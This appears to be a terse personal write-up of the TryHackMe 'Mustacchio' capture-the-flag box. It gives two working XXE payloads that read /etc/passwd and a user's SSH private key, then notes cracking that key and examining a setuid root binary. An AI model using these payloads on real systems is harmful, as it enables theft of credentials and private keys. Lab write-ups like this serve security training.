```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ <!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<xml>
	<name>&xxe;</name>
	<author>&xxe;</author>
	<comment>&xxe;</comment>
</xml>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ <!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<xml>
	<name>&xxe;</name>
	<author>&xxe;</author>
	<comment>&xxe;</comment>
</xml>
===

THEN WE GET PRIV ID_RSA KEY
CRACKED

cd /home/joe

-rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log

strings live_log
```

![unnamed_c92cb49b0d784ad4b891737298f87e68](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/Mustacchio/Port%2080/{{notename}}-202605011506.png)
![unnamed_3ad071afa01d49d1a85663ae97f46e30](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/Mustacchio/Port%2080/{{notename}}-202605011506-1.png)
![unnamed_c2f8b6f7395045269ea9e0a90fece03e](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/Mustacchio/Port%2080/{{notename}}-202605011506-2.png)
![unnamed_b7834e77ec5645fa8b808a52f48f7f4f](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/Mustacchio/Port%2080/{{notename}}-202605011507.png)